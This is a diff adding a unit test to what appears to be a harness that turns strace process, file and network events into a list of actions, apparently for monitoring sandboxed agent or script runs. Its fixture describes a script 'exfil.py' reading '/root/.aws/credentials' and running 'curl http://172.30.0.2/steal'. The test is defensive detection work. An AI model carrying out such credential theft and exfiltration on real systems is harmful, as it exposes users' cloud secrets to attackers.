@@ -101,3 +101,36 @@ def test_attribution_coverage():
 
 def test_empty_result():
     assert normalise({"agent_json": {}, "process_events": [], "file_events": [], "network_events": []}) == []
+
+
+def test_direct_mode_emits_actions_from_strace_without_tool_calls():
+    """A direct-execution run has no agent tool calls; actions must come from
+    the strace events alone, ordered by pid, with harness execs dropped."""
+    result = {
+        "agent_json": {},  # no agent in direct mode
+        "process_events": [
+            _execve(40, ["/usr/bin/bash", "/tmp/evidence/_driver.sh"]),       # driver: dropped
+            _clone(40, 41), _execve(41, ["/usr/bin/timeout", "30", "python3", "exfil.py"]),  # timeout: dropped
+            _clone(41, 42), _execve(42, ["/usr/bin/python3", "exfil.py"]),    # kept
+            _clone(42, 43), _execve(43, ["/usr/bin/curl", "http://172.30.0.2/steal"]),  # kept
+        ],
+        "file_events": [
+            {"pid": "42", "syscall": "openat", "path": "/root/.aws/credentials",
+             "args": '"/root/.aws/credentials", O_RDONLY', "return": 3},
+        ],
+        "network_events": [
+            {"pid": "43", "syscall": "connect", "return": 0,
+             "args": 'sin_port=htons(80), sin_addr=inet_addr("172.30.0.2")'},
+        ],
+    }
+    actions = normalise(result)
+    kinds = {(a["action"], a["source"], a["tool"]) for a in actions}
+    assert ("file_read", "process", "script") in kinds
+    assert ("network_connect", "process", "script") in kinds
+    # the harness wrappers must not appear as process_exec targets
+    targets = " ".join(a["target"] for a in actions)
+    assert "_driver.sh" not in targets
+    assert "timeout" not in targets
+    assert "exfil.py" in targets
+    # ordered by pid -> monotonic seq, steps grouped per pid
+    assert [a["seq"] for a in actions] == list(range(len(actions)))
